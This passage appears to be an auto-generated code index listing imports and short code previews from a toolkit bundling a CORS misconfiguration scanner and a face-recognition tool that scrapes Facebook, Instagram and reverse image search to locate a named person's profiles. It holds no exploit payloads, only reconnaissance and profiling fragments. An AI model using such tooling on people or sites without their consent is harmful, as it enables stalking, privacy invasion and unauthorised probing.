[
    {
        "label": "linecache",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "linecache",
        "description": "linecache",
        "detail": "linecache",
        "documentation": {}
    },
    {
        "label": "gevent.monkey",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "gevent.monkey",
        "description": "gevent.monkey",
        "detail": "gevent.monkey",
        "documentation": {}
    },
    {
        "label": "requests,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "requests.",
        "description": "requests.",
        "detail": "requests.",
        "documentation": {}
    },
    {
        "label": "iteritems",
        "importPath": "future.utils",
        "description": "future.utils",
        "isExtraImport": true,
        "detail": "future.utils",
        "documentation": {}
    },
    {
        "label": "urllib3",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib3",
        "description": "urllib3",
        "detail": "urllib3",
        "documentation": {}
    },
    {
        "label": "threading",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "threading",
        "description": "threading",
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "Thread",
        "importPath": "threading",
        "description": "threading",
        "isExtraImport": true,
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "Thread",
        "importPath": "threading",
        "description": "threading",
        "isExtraImport": true,
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "time",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "time",
        "description": "time",
        "detail": "time",
        "documentation": {}
    },
    {
        "label": "json",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "json",
        "description": "json",
        "detail": "json",
        "documentation": {}
    },
    {
        "label": "sys",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sys",
        "description": "sys",
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "platform",
        "importPath": "sys",
        "description": "sys",
        "isExtraImport": true,
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "os",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os",
        "description": "os",
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "argparse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "argparse",
        "description": "argparse",
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "common.common",
        "description": "common.common",
        "isExtraImport": true,
        "detail": "common.common",
        "documentation": {}
    },
    {
        "label": "Log",
        "importPath": "common.logger",
        "description": "common.logger",
        "isExtraImport": true,
        "detail": "common.logger",
        "documentation": {}
    },
    {
        "label": "CORSCheck",
        "importPath": "common.corscheck",
        "description": "common.corscheck",
        "isExtraImport": true,
        "detail": "common.corscheck",
        "documentation": {}
    },
    {
        "label": "gevent",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "gevent",
        "description": "gevent",
        "detail": "gevent",
        "documentation": {}
    },
    {
        "label": "monkey",
        "importPath": "gevent",
        "description": "gevent",
        "isExtraImport": true,
        "detail": "gevent",
        "documentation": {}
    },
    {
        "label": "Pool",
        "importPath": "gevent.pool",
        "description": "gevent.pool",
        "isExtraImport": true,
        "detail": "gevent.pool",
        "documentation": {}
    },
    {
        "label": "Queue",
        "importPath": "gevent.queue",
        "description": "gevent.queue",
        "isExtraImport": true,
        "detail": "gevent.queue",
        "documentation": {}
    },
    {
        "label": "colorama",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "colorama",
        "description": "colorama",
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "init",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "setup",
        "importPath": "setuptools",
        "description": "setuptools",
        "isExtraImport": true,
        "detail": "setuptools",
        "documentation": {}
    },
    {
        "label": "find_packages",
        "importPath": "setuptools",
        "description": "setuptools",
        "isExtraImport": true,
        "detail": "setuptools",
        "documentation": {}
    },
    {
        "label": "Path",
        "importPath": "pathlib",
        "description": "pathlib",
        "isExtraImport": true,
        "detail": "pathlib",
        "documentation": {}
    },
    {
        "label": "Path",
        "importPath": "pathlib",
        "description": "pathlib",
        "isExtraImport": true,
        "detail": "pathlib",
        "documentation": {}
    },
    {
        "label": "Path",
        "importPath": "pathlib",
        "description": "pathlib",
        "isExtraImport": true,
        "detail": "pathlib",
        "documentation": {}
    },
    {
        "label": "Path",
        "importPath": "pathlib",
        "description": "pathlib",
        "isExtraImport": true,
        "detail": "pathlib",
        "documentation": {}
    },
    {
        "label": "Path",
        "importPath": "pathlib",
        "description": "pathlib",
        "isExtraImport": true,
        "detail": "pathlib",
        "documentation": {}
    },
    {
        "label": "NoSuchElementException",
        "importPath": "selenium.common.exceptions",
        "description": "selenium.common.exceptions",
        "isExtraImport": true,
        "detail": "selenium.common.exceptions",
        "documentation": {}
    },
    {
        "label": "NoSuchElementException",
        "importPath": "selenium.common.exceptions",
        "description": "selenium.common.exceptions",
        "isExtraImport": true,
        "detail": "selenium.common.exceptions",
        "documentation": {}
    },
    {
        "label": "Keys",
        "importPath": "selenium.webdriver.common.keys",
        "description": "selenium.webdriver.common.keys",
        "isExtraImport": true,
        "detail": "selenium.webdriver.common.keys",
        "documentation": {}
    },
    {
        "label": "Keys",
        "importPath": "selenium.webdriver.common.keys",
        "description": "selenium.webdriver.common.keys",
        "isExtraImport": true,
        "detail": "selenium.webdriver.common.keys",
        "documentation": {}
    },
    {
        "label": "Keys",
        "importPath": "selenium.webdriver.common.keys",
        "description": "selenium.webdriver.common.keys",
        "isExtraImport": true,
        "detail": "selenium.webdriver.common.keys",
        "documentation": {}
    },
    {
        "label": "utils.config",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "utils.config",
        "description": "utils.config",
        "detail": "utils.config",
        "documentation": {}
    },
    {
        "label": "utils.console",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "utils.console",
        "description": "utils.console",
        "detail": "utils.console",
        "documentation": {}
    },
    {
        "label": "WebDriverWait",
        "importPath": "selenium.webdriver.support.ui",
        "description": "selenium.webdriver.support.ui",
        "isExtraImport": true,
        "detail": "selenium.webdriver.support.ui",
        "documentation": {}
    },
    {
        "label": "By",
        "importPath": "selenium.webdriver.common.by",
        "description": "selenium.webdriver.common.by",
        "isExtraImport": true,
        "detail": "selenium.webdriver.common.by",
        "documentation": {}
    },
    {
        "label": "expected_conditions",
        "importPath": "selenium.webdriver.support",
        "description": "selenium.webdriver.support",
        "isExtraImport": true,
        "detail": "selenium.webdriver.support",
        "documentation": {}
    },
    {
        "label": "tempfile",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "tempfile",
        "description": "tempfile",
        "detail": "tempfile",
        "documentation": {}
    },
    {
        "label": "csv",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "csv",
        "description": "csv",
        "detail": "csv",
        "documentation": {}
    },
    {
        "label": "HTMLSession",
        "importPath": "requests_html",
        "description": "requests_html",
        "isExtraImport": true,
        "detail": "requests_html",
        "documentation": {}
    },
    {
        "label": "HTML",
        "importPath": "weasyprint",
        "description": "weasyprint",
        "isExtraImport": true,
        "detail": "weasyprint",
        "documentation": {}
    },
    {
        "label": "webdriver",
        "importPath": "selenium",
        "description": "selenium",
        "isExtraImport": true,
        "detail": "selenium",
        "documentation": {}
    },
    {
        "label": "colored",
        "importPath": "termcolor",
        "description": "termcolor",
        "isExtraImport": true,
        "detail": "termcolor",
        "documentation": {}
    },
    {
        "label": "getpass",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "getpass",
        "description": "getpass",
        "detail": "getpass",
        "documentation": {}
    },
    {
        "label": "os,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os.",
        "description": "os.",
        "detail": "os.",
        "documentation": {}
    },
    {
        "label": "Counter",
        "importPath": "collections",
        "description": "collections",
        "isExtraImport": true,
        "detail": "collections",
        "documentation": {}
    },
    {
        "label": "FBGrabber",
        "importPath": "grabber.facebook",
        "description": "grabber.facebook",
        "isExtraImport": true,
        "detail": "grabber.facebook",
        "documentation": {}
    },
    {
        "label": "FBProfileGrabber",
        "importPath": "grabber.facebook",
        "description": "grabber.facebook",
        "isExtraImport": true,
        "detail": "grabber.facebook",
        "documentation": {}
    },
    {
        "label": "GoogleGrabber",
        "importPath": "grabber.google",
        "description": "grabber.google",
        "isExtraImport": true,
        "detail": "grabber.google",
        "documentation": {}
    },
    {
        "label": "InstagramGrabber",
        "importPath": "grabber.instagram",
        "description": "grabber.instagram",
        "isExtraImport": true,
        "detail": "grabber.instagram",
        "documentation": {}
    },
    {
        "label": "FaceRecog",
        "importPath": "face_recog",
        "description": "face_recog",
        "isExtraImport": true,
        "detail": "face_recog",
        "documentation": {}
    },
    {
        "label": "subprocess,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "subprocess.",
        "description": "subprocess.",
        "detail": "subprocess.",
        "documentation": {}
    },
    {
        "label": "makeReport",
        "importPath": "report.report",
        "description": "report.report",
        "isExtraImport": true,
        "detail": "report.report",
        "documentation": {}
    },
    {
        "label": "makeJSONReport",
        "importPath": "report.report",
        "description": "report.report",
        "isExtraImport": true,
        "detail": "report.report",
        "documentation": {}
    },
    {
        "label": "cv2",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "cv2",
        "description": "cv2",
        "detail": "cv2",
        "documentation": {}
    },
    {
        "label": "face_recognition",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "face_recognition",
        "description": "face_recognition",
        "detail": "face_recognition",
        "documentation": {}
    },
    {
        "label": "urllib.request",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib.request",
        "description": "urllib.request",
        "detail": "urllib.request",
        "documentation": {}
    },
    {
        "label": "urlretrieve",
        "importPath": "urllib.request",
        "description": "urllib.request",
        "isExtraImport": true,
        "detail": "urllib.request",
        "documentation": {}
    },
    {
        "label": "random",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "random",
        "description": "random",
        "detail": "random",
        "documentation": {}
    },
    {
        "label": "string",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "string",
        "description": "string",
        "detail": "string",
        "documentation": {}
    },
    {
        "label": "search.utilities",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "search.utilities",
        "description": "search.utilities",
        "detail": "search.utilities",
        "documentation": {}
    },
    {
        "label": "search.query",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "search.query",
        "description": "search.query",
        "detail": "search.query",
        "documentation": {}
    },
    {
        "label": "webbrowser",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "webbrowser",
        "description": "webbrowser",
        "detail": "webbrowser",
        "documentation": {}
    },
    {
        "label": "search.engines",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "search.engines",
        "description": "search.engines",
        "detail": "search.engines",
        "documentation": {}
    },
    {
        "label": "TestCase",
        "importPath": "unittest",
        "description": "unittest",
        "isExtraImport": true,
        "detail": "unittest",
        "documentation": {}
    },
    {
        "label": "TestCase",
        "importPath": "unittest",
        "description": "unittest",
        "isExtraImport": true,
        "detail": "unittest",
        "documentation": {}
    },
    {
        "label": "TestCase",
        "importPath": "unittest",
        "description": "unittest",
        "isExtraImport": true,
        "detail": "unittest",
        "documentation": {}
    },
    {
        "label": "TestCase",
        "importPath": "unittest",
        "description": "unittest",
        "isExtraImport": true,
        "detail": "unittest",
        "documentation": {}
    },
    {
        "label": "TestCase",
        "importPath": "unittest",
        "description": "unittest",
        "isExtraImport": true,
        "detail": "unittest",
        "documentation": {}
    },
    {
        "label": "TestCase",
        "importPath": "unittest",
        "description": "unittest",
        "isExtraImport": true,
        "detail": "unittest",
        "documentation": {}
    },
    {
        "label": "search.companies",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "search.companies",
        "description": "search.companies",
        "detail": "search.companies",
        "documentation": {}
    },
    {
        "label": "contextmanager",
        "importPath": "contextlib",
        "description": "contextlib",
        "isExtraImport": true,
        "detail": "contextlib",
        "documentation": {}
    },
    {
        "label": "contextmanager",
        "importPath": "contextlib",
        "description": "contextlib",
        "isExtraImport": true,
        "detail": "contextlib",
        "documentation": {}
    },
    {
        "label": "contextmanager",
        "importPath": "contextlib",
        "description": "contextlib",
        "isExtraImport": true,
        "detail": "contextlib",
        "documentation": {}
    },
    {
        "label": "contextmanager",
        "importPath": "contextlib",
        "description": "contextlib",
        "isExtraImport": true,
        "detail": "contextlib",
        "documentation": {}
    },
    {
        "label": "contextmanager",
        "importPath": "contextlib",
        "description": "contextlib",
        "isExtraImport": true,
        "detail": "contextlib",
        "documentation": {}
    },
    {
        "label": "StringIO",
        "importPath": "io",
        "description": "io",
        "isExtraImport": true,
        "detail": "io",
        "documentation": {}
    },
    {
        "label": "StringIO",
        "importPath": "io",
        "description": "io",
        "isExtraImport": true,
        "detail": "io",
        "documentation": {}
    },
    {
        "label": "StringIO",
        "importPath": "io",
        "description": "io",
        "isExtraImport": true,
        "detail": "io",
        "documentation": {}
    },
    {
        "label": "StringIO",
        "importPath": "io",
        "description": "io",
        "isExtraImport": true,
        "detail": "io",
        "documentation": {}
    },
    {
        "label": "StringIO",
        "importPath": "io",
        "description": "io",
        "isExtraImport": true,
        "detail": "io",
        "documentation": {}
    },
    {
        "label": "search.domains",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "search.domains",
        "description": "search.domains",
        "detail": "search.domains",
        "documentation": {}
    },
    {
        "label": "search.other",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "search.other",
        "description": "search.other",
        "detail": "search.other",
        "documentation": {}
    },
    {
        "label": "search.socialMedia",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "search.socialMedia",
        "description": "search.socialMedia",
        "detail": "search.socialMedia",
        "documentation": {}
    },
    {
        "label": "intro",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "intro",
        "description": "intro",
        "detail": "intro",
        "documentation": {}
    },
    {
        "label": "help",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "help",
        "description": "help",
        "detail": "help",
        "documentation": {}
    },
    {
        "label": "redssh",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "redssh",
        "description": "redssh",
        "detail": "redssh",
        "documentation": {}
    },
    {
        "label": "re",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "re",
        "description": "re",
        "detail": "re",
        "documentation": {}
    },
    {
        "label": "zlib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "zlib",
        "description": "zlib",
        "detail": "zlib",
        "documentation": {}
    },
    {
        "label": "Image",
        "importPath": "PIL",
        "description": "PIL",
        "isExtraImport": true,
        "detail": "PIL",
        "documentation": {}
    },
    {
        "label": "zipfile",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "zipfile",
        "description": "zipfile",
        "detail": "zipfile",
        "documentation": {}
    },
    {
        "label": "httpx",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "httpx",
        "description": "httpx",
        "detail": "httpx",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "helperfuncts",
        "description": "helperfuncts",
        "isExtraImport": true,
        "detail": "helperfuncts",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "helperfuncts",
        "description": "helperfuncts",
        "isExtraImport": true,
        "detail": "helperfuncts",
        "documentation": {}
    },
    {
        "label": "normalize_url",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.common.common",
        "description": "libs.programs.CORScanner.common.common",
        "peekOfCode": "def normalize_url(i):\n    if '://' in i:\n        return [i]\n    else:\n        return [\"http://\" + i, \"https://\" + i]\ndef parse_headers(headers):\n    if headers == None:\n        return None\n    else:\n        parsedheaders = {}",
        "detail": "libs.programs.CORScanner.common.common",
        "documentation": {}
    },
    {
        "label": "parse_headers",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.common.common",
        "description": "libs.programs.CORScanner.common.common",
        "peekOfCode": "def parse_headers(headers):\n    if headers == None:\n        return None\n    else:\n        parsedheaders = {}\n        for header in headers:\n            index = header.find(\":\")\n            if index == -1:\n                return None\n            parsedheaders[header[0:index].strip()] = header[index+1:].strip()",
        "detail": "libs.programs.CORScanner.common.common",
        "documentation": {}
    },
    {
        "label": "read_file",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.common.common",
        "description": "libs.programs.CORScanner.common.common",
        "peekOfCode": "def read_file(input_file):\n    lines = linecache.getlines(input_file)\n    return lines\ndef read_urls(test_url, input_file, queue):\n    if test_url:\n        for u in normalize_url(test_url):\n            queue.put(u)\n    if input_file:\n        lines = read_file(input_file)\n        for i in lines:",
        "detail": "libs.programs.CORScanner.common.common",
        "documentation": {}
    },
    {
        "label": "read_urls",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.common.common",
        "description": "libs.programs.CORScanner.common.common",
        "peekOfCode": "def read_urls(test_url, input_file, queue):\n    if test_url:\n        for u in normalize_url(test_url):\n            queue.put(u)\n    if input_file:\n        lines = read_file(input_file)\n        for i in lines:\n            for u in normalize_url(i.strip()):\n                queue.put(u)",
        "detail": "libs.programs.CORScanner.common.common",
        "documentation": {}
    },
    {
        "label": "CORSCheck",
        "kind": 6,
        "importPath": "libs.programs.CORScanner.common.corscheck",
        "description": "libs.programs.CORScanner.common.corscheck",
        "peekOfCode": "class CORSCheck:\n    \"\"\"docstring for CORSCheck\"\"\"\n    url = None\n    cfg = None\n    headers = None\n    timeout = None\n    result = {}\n    def __init__(self, url, cfg):\n        self.url = url\n        self.cfg = cfg",
        "detail": "libs.programs.CORScanner.common.corscheck",
        "documentation": {}
    },
    {
        "label": "Log",
        "kind": 6,
        "importPath": "libs.programs.CORScanner.common.logger",
        "description": "libs.programs.CORScanner.common.logger",
        "peekOfCode": "class Log:\n    \"\"\"Class Log for logging CORS misconfiguration message\"\"\"\n    print_level = 0\n    msg_level = {0: 'DEBUG', 1: 'INFO', 2: 'WARNING', 3: 'ALERT'}\n    auto_timestamp = 1\n    def __init__(self, filename, print_level, auto_timestamp=1):\n        self.filename = filename\n        self.print_level = print_level\n        self.auto_timestamp = auto_timestamp\n    def write(self, msg, level=0, auto_timestamp=1):",
        "detail": "libs.programs.CORScanner.common.logger",
        "documentation": {}
    },
    {
        "label": "banner",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.cors_scan",
        "description": "libs.programs.CORScanner.cors_scan",
        "peekOfCode": "def banner():\n    print((\"\"\"%s\n   ____ ___  ____  ____   ____    _    _   _ _   _ _____ ____  \n  / ___/ _ \\|  _ \\/ ___| / ___|  / \\  | \\ | | \\ | | ____|  _ \\ \n | |  | | | | |_) \\___ \\| |     / _ \\ |  \\| |  \\| |  _| | |_) |\n | |__| |_| |  _ < ___) | |___ / ___ \\| |\\  | |\\  | |___|  _ < \n  \\____\\___/|_| \\_\\____/ \\____/_/   \\_\\_| \\_|_| \\_|_____|_| \\_\\\n                                                               %s%s\n        # Coded By Jianjun Chen - whucjj@gmail.com%s\n    \"\"\" % ('\\033[91m', '\\033[0m', '\\033[93m', '\\033[0m')))",
        "detail": "libs.programs.CORScanner.cors_scan",
        "documentation": {}
    },
    {
        "label": "parser_error",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.cors_scan",
        "description": "libs.programs.CORScanner.cors_scan",
        "peekOfCode": "def parser_error(errmsg):\n    banner()\n    print((\"Usage: python \" + sys.argv[0] + \" [Options] use -h for help\"))\n    print((\"Error: \" + errmsg))\n    sys.exit()\ndef parse_args():\n    # parse the arguments\n    parser = argparse.ArgumentParser(\n        epilog='\\tExample: \\r\\npython ' + sys.argv[0] + \" -u google.com\")\n    parser.error = parser_error",
        "detail": "libs.programs.CORScanner.cors_scan",
        "documentation": {}
    },
    {
        "label": "parse_args",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.cors_scan",
        "description": "libs.programs.CORScanner.cors_scan",
        "peekOfCode": "def parse_args():\n    # parse the arguments\n    parser = argparse.ArgumentParser(\n        epilog='\\tExample: \\r\\npython ' + sys.argv[0] + \" -u google.com\")\n    parser.error = parser_error\n    parser._optionals.title = \"OPTIONS\"\n    parser.add_argument(\n        '-u', '--url', help=\"URL/domain to check it's CORS policy\")\n    parser.add_argument(\n        '-i',",
        "detail": "libs.programs.CORScanner.cors_scan",
        "documentation": {}
    },
    {
        "label": "scan",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.cors_scan",
        "description": "libs.programs.CORScanner.cors_scan",
        "peekOfCode": "def scan(cfg):\n    log = cfg[\"logger\"]\n    global results\n    while not cfg[\"queue\"].empty():\n        try:\n            item = cfg[\"queue\"].get(timeout=1.0)\n            cors_check = CORSCheck(item, cfg)\n            msg = cors_check.check_one_by_one()\n            # Keeping results to be written to file only if needed\n            if log.filename and msg:",
        "detail": "libs.programs.CORScanner.cors_scan",
        "documentation": {}
    },
    {
        "label": "cors_check",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.cors_scan",
        "description": "libs.programs.CORScanner.cors_scan",
        "peekOfCode": "def cors_check(url, headers=None):\n    # 0: 'DEBUG', 1: 'INFO', 2: 'WARNING', 3: 'ALERT', 4: 'disable log'\n    log = Log(None, print_level=4)\n    cfg = {\"logger\": log, \"headers\": headers, \"timeout\": 5}\n    cors_check = CORSCheck(url, cfg)\n    #msg = cors_check.check_all_in_parallel()\n    msg = cors_check.check_one_by_one()\n    return msg\ndef main():\n    init()",
        "detail": "libs.programs.CORScanner.cors_scan",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "libs.programs.CORScanner.cors_scan",
        "description": "libs.programs.CORScanner.cors_scan",
        "peekOfCode": "def main():\n    init()\n    args = parse_args()\n    #banner()\n    queue = Queue()\n    log_level = 1 if args.verbose else 2  # 1: INFO, 2: WARNING\n    log = Log(args.output, log_level)\n    cfg = {\"logger\": log, \"queue\": queue, \"headers\": parse_headers(args.headers),\n        \"timeout\": args.timeout, \"proxy\": args.proxy}\n    read_urls(args.url, args.input, queue)",
        "detail": "libs.programs.CORScanner.cors_scan",
        "documentation": {}
    },
    {
        "label": "results",
        "kind": 5,
        "importPath": "libs.programs.CORScanner.cors_scan",
        "description": "libs.programs.CORScanner.cors_scan",
        "peekOfCode": "results = []\ndef banner():\n    print((\"\"\"%s\n   ____ ___  ____  ____   ____    _    _   _ _   _ _____ ____  \n  / ___/ _ \\|  _ \\/ ___| / ___|  / \\  | \\ | | \\ | | ____|  _ \\ \n | |  | | | | |_) \\___ \\| |     / _ \\ |  \\| |  \\| |  _| | |_) |\n | |__| |_| |  _ < ___) | |___ / ___ \\| |\\  | |\\  | |___|  _ < \n  \\____\\___/|_| \\_\\____/ \\____/_/   \\_\\_| \\_|_| \\_|_____|_| \\_\\\n                                                               %s%s\n        # Coded By Jianjun Chen - whucjj@gmail.com%s",
        "detail": "libs.programs.CORScanner.cors_scan",
        "documentation": {}
    },
    {
        "label": "c",
        "kind": 5,
        "importPath": "libs.programs.CORScanner.cors_scan",
        "description": "libs.programs.CORScanner.cors_scan",
        "peekOfCode": "c = threading.Condition()\ndef scan(cfg):\n    log = cfg[\"logger\"]\n    global results\n    while not cfg[\"queue\"].empty():\n        try:\n            item = cfg[\"queue\"].get(timeout=1.0)\n            cors_check = CORSCheck(item, cfg)\n            msg = cors_check.check_one_by_one()\n            # Keeping results to be written to file only if needed",
        "detail": "libs.programs.CORScanner.cors_scan",
        "documentation": {}
    },
    {
        "label": "FBGrabber",
        "kind": 6,
        "importPath": "libs.programs.EagleEye.grabber.facebook",
        "description": "libs.programs.EagleEye.grabber.facebook",
        "peekOfCode": "class FBGrabber:\n    def __init__(self, name):\n        f_name = name.replace(' ', '%20')\n        self.url = \"https://facebook.com/public/?query={0}\".format(f_name)\n    def grabData(self):\n        console.task('Opening Webdriver')\n        driver = cfg.getWebDriver()\n        driver.get(self.url)\n        self.profile_list = []\n        self.profile_img = []",
        "detail": "libs.programs.EagleEye.grabber.facebook",
        "documentation": {}
    },
    {
        "label": "FBProfileGrabber",
        "kind": 6,
        "importPath": "libs.programs.EagleEye.grabber.facebook",
        "description": "libs.programs.EagleEye.grabber.facebook",
        "peekOfCode": "class FBProfileGrabber:\n    def __init__(self, profile_links):\n        self._pl = profile_links\n    def grabLinks(self):\n        img_urls = []\n        console.task('Opening Webdriver')\n        driver = cfg.getWebDriver()\n        for profile_url in self._pl:\n            driver.get(profile_url)\n            #first possibility",
        "detail": "libs.programs.EagleEye.grabber.facebook",
        "documentation": {}
    },
    {
        "label": "GoogleGrabber",
        "kind": 6,
        "importPath": "libs.programs.EagleEye.grabber.google",
        "description": "libs.programs.EagleEye.grabber.google",
        "peekOfCode": "class GoogleGrabber:\n    PHOTO_XPATH =  '//*[@id=\"sbtc\"]/div/div[3]/div[2]/span'\n    PHOTO_UPLOAD_XPATH = '//*[@id=\"dRSWfb\"]/div/a'\n    PRED_XPATH = \"/html/body/div[7]/div/div[9]/div[1]/div/div[2]/div[1]/div/div[2]/a\"\n    PRED_LINKS = \"//*[@class='g']\"\n    def __init__(self):\n        self.max_pages = cfg.google_img_pages()\n        console.section('Google Reverse Image Search')\n        console.task('Opening Webdriver')\n        self.driver = cfg.getWebDriver()",
        "detail": "libs.programs.EagleEye.grabber.google",
        "documentation": {}
    },
    {
        "label": "filterLink",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.grabber.google",
        "description": "libs.programs.EagleEye.grabber.google",
        "peekOfCode": "def filterLink(link):\n    filters = cfg.google_filter()\n    for f in filters:\n        if link != None and f in link:\n            return True\n    return False\nclass GoogleGrabber:\n    PHOTO_XPATH =  '//*[@id=\"sbtc\"]/div/div[3]/div[2]/span'\n    PHOTO_UPLOAD_XPATH = '//*[@id=\"dRSWfb\"]/div/a'\n    PRED_XPATH = \"/html/body/div[7]/div/div[9]/div[1]/div/div[2]/div[1]/div/div[2]/a\"",
        "detail": "libs.programs.EagleEye.grabber.google",
        "documentation": {}
    },
    {
        "label": "ImageRaiderGrabber",
        "kind": 6,
        "importPath": "libs.programs.EagleEye.grabber.imageraider",
        "description": "libs.programs.EagleEye.grabber.imageraider",
        "peekOfCode": "class ImageRaiderGrabber:\n    def __init__(self):\n        console.section('ImageRaider Reverse Image Search')\n        console.task('Opening Webdriver')\n        self.driver = cfg.getWebDriver()\n        self.csv_error = False\n    def insertImageLinks(self, images):\n        self.driver.get(\"https://www.imageraider.com/\")\n        input = self.driver.find_elements_by_xpath('//*[@id=\"topurllist\"]')[0]\n        for i in images:",
        "detail": "libs.programs.EagleEye.grabber.imageraider",
        "documentation": {}
    },
    {
        "label": "filterLink",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.grabber.imageraider",
        "description": "libs.programs.EagleEye.grabber.imageraider",
        "peekOfCode": "def filterLink(link):\n    filters = cfg.google_filter()\n    for f in filters:\n        if f in link:\n            return True\n    return False\nclass ImageRaiderGrabber:\n    def __init__(self):\n        console.section('ImageRaider Reverse Image Search')\n        console.task('Opening Webdriver')",
        "detail": "libs.programs.EagleEye.grabber.imageraider",
        "documentation": {}
    },
    {
        "label": "InstagramGrabber",
        "kind": 6,
        "importPath": "libs.programs.EagleEye.grabber.instagram",
        "description": "libs.programs.EagleEye.grabber.instagram",
        "peekOfCode": "class InstagramGrabber:\n    def __init__(self, username):\n        self.username = username\n    def getLinks(self):\n        session = HTMLSession()\n        r = session.get('https://instagram.com/' + self.username)\n        l = r.html.find('body > script:nth-child(4)')[0].text\n        json_str = l[21:]\n        json_str = json_str[:-1]\n        json_parsed = json.loads(json_str)",
        "detail": "libs.programs.EagleEye.grabber.instagram",
        "documentation": {}
    },
    {
        "label": "makeReport",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.report.report",
        "description": "libs.programs.EagleEye.report.report",
        "peekOfCode": "def makeReport(name, links, preds, instnames):\n    #sort\n    links = sorted(links)\n    preds = sorted(preds)\n    instnames = sorted(instnames)\n    name = name.strip()\n    name = name.replace('%20', '-')\n    with open('./report/template.html', 'r') as f:\n        template_data = f.read()\n    template_data = template_data.replace('{{INPUT_NAME}}', name)",
        "detail": "libs.programs.EagleEye.report.report",
        "documentation": {}
    },
    {
        "label": "makeJSONReport",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.report.report",
        "description": "libs.programs.EagleEye.report.report",
        "peekOfCode": "def makeJSONReport(name, links, preds, instnames, fn):\n    data = {}\n    links = sorted(links)\n    preds = sorted(preds)\n    instnames = sorted(instnames)\n    name = name.strip()\n    name = name.replace('%20', '-')\n    data['name'] = name\n    data['social_urls'] = links\n    data['google_predictions'] = preds",
        "detail": "libs.programs.EagleEye.report.report",
        "documentation": {}
    },
    {
        "label": "timeout",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.config",
        "description": "libs.programs.EagleEye.utils.config",
        "peekOfCode": "def timeout():\n    return int(cfg['DEFAULTS']['SLEEP_DELAY'])\ndef google_img_pages():\n    return int(cfg['DEFAULTS']['GOOGLE_IMG_PAGES'])\ndef google_filter():\n    return cfg['FILTER']\ndef instaLimit():\n    return int(cfg['INSTA_VALIDATION_MAX_IMAGES'])\ndef jitters():\n    return int(cfg['JITTERS'])",
        "detail": "libs.programs.EagleEye.utils.config",
        "documentation": {}
    },
    {
        "label": "google_img_pages",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.config",
        "description": "libs.programs.EagleEye.utils.config",
        "peekOfCode": "def google_img_pages():\n    return int(cfg['DEFAULTS']['GOOGLE_IMG_PAGES'])\ndef google_filter():\n    return cfg['FILTER']\ndef instaLimit():\n    return int(cfg['INSTA_VALIDATION_MAX_IMAGES'])\ndef jitters():\n    return int(cfg['JITTERS'])\ndef getWebDriver():\n    if not os.path.isfile(cfg['WEBDRIVER']['PATH']):",
        "detail": "libs.programs.EagleEye.utils.config",
        "documentation": {}
    },
    {
        "label": "google_filter",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.config",
        "description": "libs.programs.EagleEye.utils.config",
